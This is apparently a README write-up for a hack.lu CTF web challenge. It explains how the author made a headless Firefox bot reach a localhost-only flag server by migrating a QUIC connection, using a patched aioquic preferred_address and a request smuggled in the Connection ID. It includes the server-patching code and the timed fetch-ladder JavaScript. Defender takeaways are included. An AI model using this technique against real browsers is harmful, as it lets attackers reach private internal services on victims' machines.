<div align="center">

# Talk to the Locals — QUIC Migration as a Browser SSRF Primitive

</div>

> hack.lu CTF web challenge, solved by making the victim's browser migrate a live QUIC connection to IPv6 localhost — with the request smuggled inside the Connection ID.

![Event](https://img.shields.io/badge/event-hack.lu_CTF-8b5cf6)
![Category](https://img.shields.io/badge/category-web-blue)
![Solved](https://img.shields.io/badge/status-solved-success)
![Stack](https://img.shields.io/badge/stack-aioquic_%2B_HTTP--3-teal)

This README explains [lab.py](lab.py), my exploit for **"Talk to the Locals"**. A headless
Firefox bot visits a URL of your choosing; the flag server listens on **IPv6 localhost only**
and classic SSRF can't reach it. The way in: when an HTTP/3 server advertises a
`preferred_address`, Firefox migrates the connection there **on its own** — and the
migration carries up to 20 bytes of server-chosen Connection ID straight to the listener.

```
  stage            mechanism                                what it buys
  ────────────────────────────────────────────────────────────────────────────
  1  advertise     HTTPS origin + Alt-Svc: h3=":9443"    -> Firefox upgrades the
                   (4 port pairs, docker-free)               next fetch to QUIC
  2  fan out       page JS hits all origins on a          -> at least one h3 request
                   300..8000 ms timed ladder                inside the bot window
  3  migrate       preferred_address = ::ffff:127.0.0.1:6767 -> browser itself opens
                   (server-controlled, unvalidated)           a channel to LOCALHOST
  4  deliver       connection_id = "ive me the flag bro\n" -> CID *is* the request;
                                                                answer rides the
                                                                migrated connection
  ────────────────────────────────────────────────────────────────────────────
  One bot visit. No direct local request ever made by the page. QUIC did the talking.
```

## The short version

1. The bot's browser blocks the page from fetching `localhost` directly — but QUIC
   connection migration is **not a fetch**. It's transport-level machinery the server
   steers by setting `preferred_address` in its transport parameters.
2. I run an HTTP/3 server (aioquic, transport parameters monkey-patched) whose preferred
   address points at `::ffff:127.0.0.1:6767` — the flag server.
3. The migration's **Connection ID is attacker-chosen**, so the CID itself carries the
   "request" bytes to the local service.
4. To get the bot there inside its short visit window, the page is served over HTTPS with
   `Alt-Svc: h3=...` on **four port pairs**, and inline JS re-hits every origin on a timed
   ladder — first visit teaches Firefox the upgrade, a later one does it over QUIC.

> **Why Alt-Svc first?** Firefox won't use h3 on a origin it has only seen over TCP/HTTPS.
   Each origin needs one plain visit to cache the `Alt-Svc` header, then the retry happens
   over QUIC — where `preferred_address` exists at all. Four parallel origins multiply the
   chances of hitting the window.

## Contents

- [The server](#the-server)
- [The migration payload](#the-migration-payload)
- [Winning the visit window](#winning-the-visit-window)
- [Running it](#running-it)
- [Takeaways for defenders](#takeaways-for-defenders)
- [Jargon, briefly](#jargon-briefly)
- [Thanks](#thanks)

---

## The server

Four `(tcp, udp)` port pairs. Each TCP listener serves a minimal HTTPS page carrying
`Alt-Svc: h3=":9xxx"; ma=300`; each UDP listener is an aioquic HTTP/3 endpoint with the
patched transport parameters:

```python
Real = conn.QuicTransportParameters

def params(**kw):
    p = Real(**kw)
    p.preferred_address = QuicPreferredAddress(
        ipv4_address=None,
        ipv6_address=("::ffff:127.0.0.1", 6767),   # from the browser's seat: LOCALHOST
        connection_id=b"ive me the flag bro\n",     # 20 bytes exact — the request
        stateless_reset_token=bytes(16),
    )
    return p

conn.QuicTransportParameters = params   # aioquic has no public API for this
```

## The migration payload

The CID must be **exactly 20 bytes**. The phrase and its trailing newline fit precisely —
that byte budget is the entire "protocol" spoken to the flag server.

## Winning the visit window

```js
var P=[8443,8444,8445,8446];
function go(){P.forEach(p=>fetch('https://'+location.hostname+':'+p+'/?'+Math.random()).catch(()=>{}));}
go();[300,600,1000,1500,2200,3000,4000,5000,6500,8000].forEach(t=>setTimeout(go,t));
```

The `.catch(()=>{})` keeps failed upgrades quiet; `Math.random()` busts caches. The ladder
covers the bot's whole visit duration, so the Alt-Svc learning fetch and the h3 retry are
guaranteed to both land.

## Running it

```bash
pip install aioquic
# put a valid cert pair for your host at certs/fullchain.pem + certs/privkey.pem
# (e.g. a Let's Encrypt cert for the domain the bot will visit)
python3 lab.py          # v2: multi-origin, all four port pairs
python3 lab443.py       # variant pinned to :443
python3 dump6767.py     # observer for the flag-server side
```

> [!IMPORTANT]
> `preferred_address` must be reachable **from the browser's perspective** — an IPv6-mapped
> loopback the client resolves locally, not your server's own address. The bot must be able
> to reach your HTTPS origins first (real cert, real DNS), or nothing upgrades.

## Takeaways for defenders

- **QUIC migration is SSRF surface.** Any h3 endpoint can redirect a live client connection
  to an arbitrary IP:port — restrictions that guard `fetch()` never see it.
- `Alt-Svc` + `preferred_address` chaining turns "visit my page once" into "connect to
  localhost with 20 attacker-controlled bytes".
- Clients should refuse `preferred_address` in private/loopback ranges, and internal
  services shouldn't trust transport-layer metadata as a request channel.

## Jargon, briefly

| Term | Meaning |
| --- | --- |
| **Alt-Svc** | HTTP header telling the browser the origin also speaks HTTP/3 on another port. |
| **preferred_address** | QUIC transport parameter inviting the client to migrate the connection to a new address. |
| **CID** | Connection ID — up to 20 bytes carried in every QUIC packet header, server-chosen. |
| **Migration** | The client moving an established QUIC connection to a new path without restarting it. |

## Thanks

- hack.lu organizers for the most creative "SSRF without SSRF" I've played.
- aioquic, for being patchable enough to say things the API never intended.

*Exploit: [lab.py](lab.py) · Variant: [lab443.py](lab443.py) · Observer: [dump6767.py](dump6767.py)*
